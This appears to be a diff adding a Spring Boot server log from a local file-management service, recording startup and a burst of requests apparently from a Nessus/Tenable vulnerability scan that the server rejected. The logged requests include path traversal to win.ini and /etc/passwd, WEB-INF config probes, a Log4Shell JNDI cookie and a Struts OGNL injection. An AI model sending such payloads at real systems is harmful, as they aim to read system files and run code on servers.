@@ -1,0 +1,155 @@
+2025-06-20 10:06:00.382 [main] INFO  [null] c.a.f.FileManagementApplication.logStarting - Starting FileManagementApplication using Java 21.0.6 with PID 22172 (C:\Users\10598925708\IdeaProjects\file-management-service\target\classes started by 10598925708 in C:\Users\10598925708\IdeaProjects\file-management-service)
+2025-06-20 10:06:00.392 [main] INFO  [null] c.a.f.FileManagementApplication.logStartupProfileInfo - No active profile set, falling back to 1 default profile: "default"
+2025-06-20 10:06:01.306 [main] INFO  [null] o.s.d.r.c.RepositoryConfigurationDelegate.registerRepositoriesIn - Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+2025-06-20 10:06:01.377 [main] INFO  [null] o.s.d.r.c.RepositoryConfigurationDelegate.registerRepositoriesIn - Finished Spring Data repository scanning in 65 ms. Found 1 JPA repository interface.
+2025-06-20 10:06:02.104 [main] INFO  [null] o.s.b.w.e.tomcat.TomcatWebServer.initialize - Tomcat initialized with port 8090 (http)
+2025-06-20 10:06:02.128 [main] INFO  [null] o.a.coyote.http11.Http11NioProtocol.log - Initializing ProtocolHandler ["http-nio-8090"]
+2025-06-20 10:06:02.128 [main] INFO  [null] o.a.catalina.core.StandardService.log - Starting service [Tomcat]
+2025-06-20 10:06:02.141 [main] INFO  [null] o.a.catalina.core.StandardEngine.log - Starting Servlet engine: [Apache Tomcat/10.1.41]
+2025-06-20 10:06:02.229 [main] INFO  [null] o.a.c.c.C.[Tomcat].[localhost].[/].log - Initializing Spring embedded WebApplicationContext
+2025-06-20 10:06:02.229 [main] INFO  [null] o.s.b.w.s.c.ServletWebServerApplicationContext.prepareWebApplicationContext - Root WebApplicationContext: initialization completed in 1762 ms
+2025-06-20 10:06:02.508 [main] INFO  [null] o.h.jpa.internal.util.LogHelper.logPersistenceUnitInformation - HHH000204: Processing PersistenceUnitInfo [name: default]
+2025-06-20 10:06:02.614 [main] INFO  [null] org.hibernate.Version.logVersion - HHH000412: Hibernate ORM core version 6.6.15.Final
+2025-06-20 10:06:02.659 [main] INFO  [null] o.h.c.i.RegionFactoryInitiator.initiateService - HHH000026: Second-level cache disabled
+2025-06-20 10:06:03.150 [main] INFO  [null] o.s.o.j.p.SpringPersistenceUnitInfo.addTransformer - No LoadTimeWeaver setup: ignoring JPA class transformer
+2025-06-20 10:06:03.182 [main] INFO  [null] com.zaxxer.hikari.HikariDataSource.getConnection - HikariPool-1 - Starting...
+2025-06-20 10:06:03.471 [main] INFO  [null] com.zaxxer.hikari.pool.HikariPool.checkFailFast - HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@12f51a65
+2025-06-20 10:06:03.471 [main] INFO  [null] com.zaxxer.hikari.HikariDataSource.getConnection - HikariPool-1 - Start completed.
+2025-06-20 10:06:03.514 [main] WARN  [null] org.hibernate.orm.deprecation.constructDialect - HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+2025-06-20 10:06:03.530 [main] INFO  [null] o.hibernate.orm.connections.pooling.logConnectionInfo - HHH10001005: Database info:
+	Database JDBC URL [Connecting through datasource 'HikariDataSource (HikariPool-1)']
+	Database driver: undefined/unknown
+	Database version: 17.4
+	Autocommit mode: undefined/unknown
+	Isolation level: undefined/unknown
+	Minimum pool size: undefined/unknown
+	Maximum pool size: undefined/unknown
+2025-06-20 10:06:04.380 [main] INFO  [null] o.h.e.t.j.p.i.JtaPlatformInitiator.initiateService - HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+2025-06-20 10:06:04.473 [main] INFO  [null] o.s.o.j.LocalContainerEntityManagerFactoryBean.buildNativeEntityManagerFactory - Initialized JPA EntityManagerFactory for persistence unit 'default'
+2025-06-20 10:06:05.501 [main] INFO  [null] o.a.coyote.http11.Http11NioProtocol.log - Starting ProtocolHandler ["http-nio-8090"]
+2025-06-20 10:06:05.535 [main] INFO  [null] o.s.b.w.e.tomcat.TomcatWebServer.start - Tomcat started on port 8090 (http) with context path '/'
+2025-06-20 10:06:05.542 [main] INFO  [null] c.a.f.FileManagementApplication.logStarted - Started FileManagementApplication in 5.748 seconds (process running for 7.647)
+2025-06-20 10:07:47.834 [http-nio-8090-exec-1] INFO  [null] o.a.c.c.C.[Tomcat].[localhost].[/].log - Initializing Spring DispatcherServlet 'dispatcherServlet'
+2025-06-20 10:07:47.834 [http-nio-8090-exec-1] INFO  [null] o.s.web.servlet.DispatcherServlet.initServletBean - Initializing Servlet 'dispatcherServlet'
+2025-06-20 10:07:47.903 [http-nio-8090-exec-1] INFO  [null] o.s.web.servlet.DispatcherServlet.initServletBean - Completed initialization in 55 ms
+2025-06-20 12:04:07.794 [SpringApplicationShutdownHook] INFO  [null] o.s.b.w.e.tomcat.GracefulShutdown.shutDownGracefully - Commencing graceful shutdown. Waiting for active requests to complete
+2025-06-20 12:04:07.877 [tomcat-shutdown] INFO  [null] o.s.b.w.e.tomcat.GracefulShutdown.doShutdown - Graceful shutdown complete
+2025-06-20 12:04:07.954 [SpringApplicationShutdownHook] INFO  [null] o.s.o.j.LocalContainerEntityManagerFactoryBean.destroy - Closing JPA EntityManagerFactory for persistence unit 'default'
+2025-06-20 12:04:08.106 [SpringApplicationShutdownHook] INFO  [null] com.zaxxer.hikari.HikariDataSource.close - HikariPool-1 - Shutdown initiated...
+2025-06-20 12:04:08.139 [SpringApplicationShutdownHook] INFO  [null] com.zaxxer.hikari.HikariDataSource.close - HikariPool-1 - Shutdown completed.
+2025-06-20 12:04:13.427 [main] INFO  [null] c.a.f.FileManagementApplication.logStarting - Starting FileManagementApplication using Java 21.0.6 with PID 21480 (C:\Users\10598925708\IdeaProjects\file-management-service\target\classes started by 10598925708 in C:\Users\10598925708\IdeaProjects\file-management-service)
+2025-06-20 12:04:13.429 [main] INFO  [null] c.a.f.FileManagementApplication.logStartupProfileInfo - No active profile set, falling back to 1 default profile: "default"
+2025-06-20 12:04:14.263 [main] INFO  [null] o.s.d.r.c.RepositoryConfigurationDelegate.registerRepositoriesIn - Bootstrapping Spring Data JPA repositories in DEFAULT mode.
+2025-06-20 12:04:14.310 [main] INFO  [null] o.s.d.r.c.RepositoryConfigurationDelegate.registerRepositoriesIn - Finished Spring Data repository scanning in 38 ms. Found 1 JPA repository interface.
+2025-06-20 12:04:14.907 [main] INFO  [null] o.s.b.w.e.tomcat.TomcatWebServer.initialize - Tomcat initialized with port 8090 (http)
+2025-06-20 12:04:14.920 [main] INFO  [null] o.a.coyote.http11.Http11NioProtocol.log - Initializing ProtocolHandler ["http-nio-8090"]
+2025-06-20 12:04:14.923 [main] INFO  [null] o.a.catalina.core.StandardService.log - Starting service [Tomcat]
+2025-06-20 12:04:14.923 [main] INFO  [null] o.a.catalina.core.StandardEngine.log - Starting Servlet engine: [Apache Tomcat/10.1.41]
+2025-06-20 12:04:14.978 [main] INFO  [null] o.a.c.c.C.[Tomcat].[localhost].[/].log - Initializing Spring embedded WebApplicationContext
+2025-06-20 12:04:14.980 [main] INFO  [null] o.s.b.w.s.c.ServletWebServerApplicationContext.prepareWebApplicationContext - Root WebApplicationContext: initialization completed in 1503 ms
+2025-06-20 12:04:15.210 [main] INFO  [null] o.h.jpa.internal.util.LogHelper.logPersistenceUnitInformation - HHH000204: Processing PersistenceUnitInfo [name: default]
+2025-06-20 12:04:15.284 [main] INFO  [null] org.hibernate.Version.logVersion - HHH000412: Hibernate ORM core version 6.6.15.Final
+2025-06-20 12:04:15.329 [main] INFO  [null] o.h.c.i.RegionFactoryInitiator.initiateService - HHH000026: Second-level cache disabled
+2025-06-20 12:04:15.658 [main] INFO  [null] o.s.o.j.p.SpringPersistenceUnitInfo.addTransformer - No LoadTimeWeaver setup: ignoring JPA class transformer
+2025-06-20 12:04:15.682 [main] INFO  [null] com.zaxxer.hikari.HikariDataSource.getConnection - HikariPool-1 - Starting...
+2025-06-20 12:04:15.906 [main] INFO  [null] com.zaxxer.hikari.pool.HikariPool.checkFailFast - HikariPool-1 - Added connection org.postgresql.jdbc.PgConnection@4756e5cc
+2025-06-20 12:04:15.908 [main] INFO  [null] com.zaxxer.hikari.HikariDataSource.getConnection - HikariPool-1 - Start completed.
+2025-06-20 12:04:15.955 [main] WARN  [null] org.hibernate.orm.deprecation.constructDialect - HHH90000025: PostgreSQLDialect does not need to be specified explicitly using 'hibernate.dialect' (remove the property setting and it will be selected by default)
+2025-06-20 12:04:15.969 [main] INFO  [null] o.hibernate.orm.connections.pooling.logConnectionInfo - HHH10001005: Database info:
+	Database JDBC URL [Connecting through datasource 'HikariDataSource (HikariPool-1)']
+	Database driver: undefined/unknown
+	Database version: 17.4
+	Autocommit mode: undefined/unknown
+	Isolation level: undefined/unknown
+	Minimum pool size: undefined/unknown
+	Maximum pool size: undefined/unknown
+2025-06-20 12:04:16.642 [main] INFO  [null] o.h.e.t.j.p.i.JtaPlatformInitiator.initiateService - HHH000489: No JTA platform available (set 'hibernate.transaction.jta.platform' to enable JTA platform integration)
+2025-06-20 12:04:16.726 [main] INFO  [null] o.s.o.j.LocalContainerEntityManagerFactoryBean.buildNativeEntityManagerFactory - Initialized JPA EntityManagerFactory for persistence unit 'default'
+2025-06-20 12:04:17.492 [main] INFO  [null] o.a.coyote.http11.Http11NioProtocol.log - Starting ProtocolHandler ["http-nio-8090"]
+2025-06-20 12:04:17.521 [main] INFO  [null] o.s.b.w.e.tomcat.TomcatWebServer.start - Tomcat started on port 8090 (http) with context path '/'
+2025-06-20 12:04:17.529 [main] INFO  [null] c.a.f.FileManagementApplication.logStarted - Started FileManagementApplication in 4.605 seconds (process running for 6.86)
+2025-06-20 12:05:57.863 [http-nio-8090-exec-1] INFO  [null] o.a.c.c.C.[Tomcat].[localhost].[/].log - Initializing Spring DispatcherServlet 'dispatcherServlet'
+2025-06-20 12:05:57.872 [http-nio-8090-exec-1] INFO  [null] o.s.web.servlet.DispatcherServlet.initServletBean - Initializing Servlet 'dispatcherServlet'
+2025-06-20 12:05:57.910 [http-nio-8090-exec-1] INFO  [null] o.s.web.servlet.DispatcherServlet.initServletBean - Completed initialization in 36 ms
+2025-06-20 13:09:54.609 [http-nio-8090-exec-7] WARN  [null] o.a.c.util.SessionIdGeneratorBase.log - Creation of SecureRandom instance for session ID generation using [SHA1PRNG] took [102] milliseconds.
+2025-06-20 14:55:41.769 [http-nio-8090-exec-1] INFO  [null] o.a.coyote.http11.Http11Processor.log - Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xa30x010x000x000x9f0x030x010xa40x090xedw0xe10x100x1d0xde0xea0xb8v30xa90xbc0xf00xe9BN0xeen0x9eF0x900xd2u\0xbf0xe60xc40xa60x00#0x000x00R0xc00x0a0xc00x140x0090x0080x000x880x000x870xc00x190x00:0x000x890xc00x090xc00x130x0030x0020x000x9a0x000x990x00E0x00D0xc00x180x0040x000x9b0x00F0xc00x070xc00x110xc00x160x000x180xc00x080xc00x120x000x160x000x130xc00x170x000x1b0x0050x000x840x00/0x000x960x00A0x000x070x000x050x000x040x000x0a0x000xff0x010x000x00$0x000x0b0x000x040x030x000x010x020x000x0a0x000x0c0x000x0a0x000x1d0x000x170x000x1e0x000x190x000x180x00#0x000x000x000x160x000x000x000x170x000x00...]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:403)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:271)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:903)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1740)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1189)
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:658)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:63)
+	at java.base/java.lang.Thread.run(Thread.java:1583)
+2025-06-20 14:58:16.364 [http-nio-8090-exec-7] INFO  [null] o.a.coyote.http11.Http11Processor.log - Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+java.lang.IllegalArgumentException: Invalid character found in method name [HELP0x0d0x0a0x0d0x0a...]. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:403)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:271)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:903)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1740)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1189)
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:658)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:63)
+	at java.base/java.lang.Thread.run(Thread.java:1583)
+2025-06-20 14:58:39.898 [http-nio-8090-exec-6] WARN  [null] o.s.w.s.r.ResourceHandlerUtils.isInvalidPath - "Path contains "../" after call to StringUtils#cleanPath: [.../.../.../.../.../.../.../.../.../windows/win.ini]"
+2025-06-20 14:58:39.925 [http-nio-8090-exec-7] WARN  [null] o.s.w.s.r.ResourceHandlerUtils.isInvalidPath - "Path contains "../" after call to StringUtils#cleanPath: [.../.../.../.../.../.../.../.../.../winnt/win.ini]"
+2025-06-20 14:58:39.946 [http-nio-8090-exec-10] WARN  [null] o.s.w.s.r.ResourceHandlerUtils.isInvalidPath - "Path contains "../" after call to StringUtils#cleanPath: [..../..../..../..../..../..../..../..../..../windows/win.ini]"
+2025-06-20 14:58:39.970 [http-nio-8090-exec-1] WARN  [null] o.s.w.s.r.ResourceHandlerUtils.isInvalidPath - "Path contains "../" after call to StringUtils#cleanPath: [..../..../..../..../..../..../..../..../..../winnt/win.ini]"
+2025-06-20 14:58:40.256 [http-nio-8090-exec-8] WARN  [null] o.s.w.s.r.ResourceHandlerUtils.isInvalidPath - "Path contains "../" after call to StringUtils#cleanPath: [..../..../..../..../..../..../..../..../..../..../..../..../etc/passwd]"
+2025-06-20 14:58:42.512 [http-nio-8090-exec-4] INFO  [null] o.a.coyote.http11.Http11Processor.log - Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+java.lang.IllegalArgumentException: Invalid character found in the request target [c:\boot.ini ]. The valid characters are defined in RFC 7230 and RFC 3986
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:486)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:271)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:903)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1740)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1189)
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:658)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:63)
+	at java.base/java.lang.Thread.run(Thread.java:1583)
+2025-06-20 14:58:48.029 [http-nio-8090-exec-5] WARN  [null] o.s.b.a.w.s.WelcomePageHandlerMapping.getAcceptedMediaTypes - Received invalid Accept header. Assuming all media types are accepted
+2025-06-20 14:58:48.047 [http-nio-8090-exec-8] WARN  [null] o.s.b.a.w.s.WelcomePageHandlerMapping.getAcceptedMediaTypes - Received invalid Accept header. Assuming all media types are accepted
+2025-06-20 14:58:48.056 [http-nio-8090-exec-4] WARN  [null] o.s.b.a.w.s.WelcomePageHandlerMapping.getAcceptedMediaTypes - Received invalid Accept header. Assuming all media types are accepted
+2025-06-20 14:58:48.068 [http-nio-8090-exec-1] WARN  [null] o.s.b.a.w.s.WelcomePageHandlerMapping.getAcceptedMediaTypes - Received invalid Accept header. Assuming all media types are accepted
+2025-06-20 14:58:48.073 [http-nio-8090-exec-6] WARN  [null] o.s.b.a.w.s.WelcomePageHandlerMapping.getAcceptedMediaTypes - Received invalid Accept header. Assuming all media types are accepted
+2025-06-20 14:59:15.548 [http-nio-8090-exec-3] WARN  [null] o.a.c.w.AbstractFileResourceSet.log - Resource for web application [] at path [/niet419236743.] was not loaded as the canonical path [/niet419236743] did not match. Use of symlinks is one possible cause.
+2025-06-20 14:59:43.809 [http-nio-8090-exec-2] WARN  [null] o.s.w.s.r.ResourceHandlerUtils.isInvalidPath - "Path with "WEB-INF" or "META-INF": [WEB-INF./web.xml]"
+2025-06-20 15:00:45.338 [http-nio-8090-exec-3] INFO  [null] o.a.tomcat.util.http.parser.Cookie.log - A cookie header was received [${jndi:ldap://log4shell-generic-2Fhey7jjdw04abu7NgHW${lower:ten}.w.nessus.org/nessus}=${jndi:ldap://log4shell-generic-2Fhey7jjdw04abu7NgHW${lower:ten}.w.nessus.org/nessus};] that contained an invalid cookie. That cookie will be ignored.
+ Note: further occurrences of this error will be logged at DEBUG level.
+2025-06-20 15:00:45.413 [http-nio-8090-exec-3] WARN  [null] o.s.b.a.w.s.WelcomePageHandlerMapping.getAcceptedMediaTypes - Received invalid Accept header. Assuming all media types are accepted
+2025-06-20 15:00:52.212 [http-nio-8090-exec-6] WARN  [null] o.s.b.a.w.s.WelcomePageHandlerMapping.getAcceptedMediaTypes - Received invalid Accept header. Assuming all media types are accepted
+2025-06-20 16:27:54.966 [http-nio-8090-exec-5] INFO  [null] o.a.coyote.http11.Http11Processor.log - Error parsing HTTP request header
+ Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
+java.lang.IllegalArgumentException: Invalid character found in the request target [/?tag=tenable-525428812&method%3a%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23writer%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23writer.println(%23parameters.tag[0]),%23writer.flush(),%23writer.close ]. The valid characters are defined in RFC 7230 and RFC 3986
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:478)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:271)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:903)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1740)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1189)
+	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:658)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:63)
+	at java.base/java.lang.Thread.run(Thread.java:1583)
+2025-06-20 16:28:03.317 [http-nio-8090-exec-6] WARN  [null] o.s.w.s.r.ResourceHandlerUtils.isInvalidPath - "Path with "WEB-INF" or "META-INF": [s/cfx/_/WEB-INF/web.xml]"
+2025-06-20 16:28:03.334 [http-nio-8090-exec-2] WARN  [null] o.s.w.s.r.ResourceHandlerUtils.isInvalidPath - "Path with "WEB-INF" or "META-INF": [s/cfx/_/WEB-INF/classes/seraph-config.xml]"
+2025-06-20 16:28:03.341 [http-nio-8090-exec-5] WARN  [null] o.s.w.s.r.ResourceHandlerUtils.isInvalidPath - "Path with "WEB-INF" or "META-INF": [s/cfx/_/WEB-INF/decorators.xml]"
+2025-06-20 16:28:03.348 [http-nio-8090-exec-10] WARN  [null] o.s.w.s.r.ResourceHandlerUtils.isInvalidPath - "Path with "WEB-INF" or "META-INF": [s/cfx/_/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties]"
+2025-06-20 16:28:03.356 [http-nio-8090-exec-4] WARN  [null] o.s.w.s.r.ResourceHandlerUtils.isInvalidPath - "Path with "WEB-INF" or "META-INF": [s/cfx/_/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.xml]"
+2025-06-20 16:28:03.366 [http-nio-8090-exec-9] WARN  [null] o.s.w.s.r.ResourceHandlerUtils.isInvalidPath - "Path with "WEB-INF" or "META-INF": [s/cfx/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml]"
+2025-06-20 16:28:03.383 [http-nio-8090-exec-1] WARN  [null] o.s.w.s.r.ResourceHandlerUtils.isInvalidPath - "Path with "WEB-INF" or "META-INF": [s/cfx/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties]"
+2025-06-20 16:28:05.632 [http-nio-8090-exec-10] WARN  [null] o.s.w.s.r.ResourceHandlerUtils.isInvalidPath - "Path contains "../" after call to StringUtils#cleanPath: [setup/setup-/../../log.jsp]"
+2025-06-20 16:28:06.085 [http-nio-8090-exec-9] WARN  [null] o.s.w.s.r.ResourceHandlerUtils.isInvalidPath - "Path contains "../" after call to StringUtils#cleanPath: [../../../../windows/win.ini]"
+2025-06-20 16:28:06.094 [http-nio-8090-exec-10] WARN  [null] o.s.w.s.r.ResourceHandlerUtils.isInvalidPath - "Path contains "../" after call to StringUtils#cleanPath: [../../../../winnt/win.ini]"
+2025-06-20 16:28:06.104 [http-nio-8090-exec-5] WARN  [null] o.s.w.s.r.ResourceHandlerUtils.isInvalidPath - "Path contains "../" after call to StringUtils#cleanPath: [../../../../../../../etc/passwd]"
+2025-06-20 16:28:06.217 [http-nio-8090-exec-1] WARN  [null] o.a.c.w.AbstractFileResourceSet.log - Resource for web application [] at path [/status.xsl.] was not loaded as the canonical path [/status.xsl] did not match. Use of symlinks is one possible cause.
+2025-06-20 16:28:12.052 [http-nio-8090-exec-5] WARN  [null] o.a.c.w.AbstractFileResourceSet.log - Resource for web application [] at path [/default.asp.] was not loaded as the canonical path [/default.asp] did not match. Use of symlinks is one possible cause.
